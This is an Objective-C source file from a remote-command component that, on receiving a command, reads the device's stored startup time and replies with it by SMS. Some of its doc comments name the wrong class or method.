/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  SetWatchFlagsProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  24/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

#import "RequestStartupTimeProcessor.h"
#import "PrefStartupTime.h"

@interface RequestStartupTimeProcessor (PrivateAPI)
- (void) processRequestStartUpTime;
- (void) sendReplySMSWithResult:(NSString *) aResult;  
@end

@implementation RequestStartupTimeProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the RequestStartupTimeProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (RequestStartupTimeProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData {
    DLog (@"RequestStartupTimeProcessor---->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the RequestStartupTimeProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
 */

- (void) doProcessingCommand {
	DLog (@"RequestStartupTimeProcessor--->doProcessingCommand");
	[self processRequestStartUpTime];
}


#pragma mark RequestSettingsProcessor Private Methods

/**
 - Method name: processRequestSettings
 - Purpose:This method is used to process request settings
 - Argument list and description: No Argument
 - Return description: No Return Type
*/

- (void) processRequestStartUpTime{
	DLog (@"RequestStartupTimeProcessor-->processRequestStartUpTime");
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefStartupTime *prefTime = (PrefStartupTime *)[prefManager preference:kStartup_Time];
	NSString *result=[NSString stringWithFormat:@"%@%@",NSLocalizedString(@"kRequestStartupTime", @""),[prefTime mStartupTime]];
    [self sendReplySMSWithResult:result];
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
 */

- (void) sendReplySMSWithResult: (NSString *) aResult {
	DLog (@"RequestStartupTimeProcessor--->sendReplySMS");
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
															    					  andErrorCode:_SUCCESS_];
	NSString *requestStartUpTimeMessage=[NSString stringWithFormat:@"%@%@",messageFormat,aResult];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:requestStartUpTimeMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {	
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
														       andMessage:requestStartUpTimeMessage];
	}
}

/*
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
 */

-(void) dealloc {
	[super dealloc];
}


@end
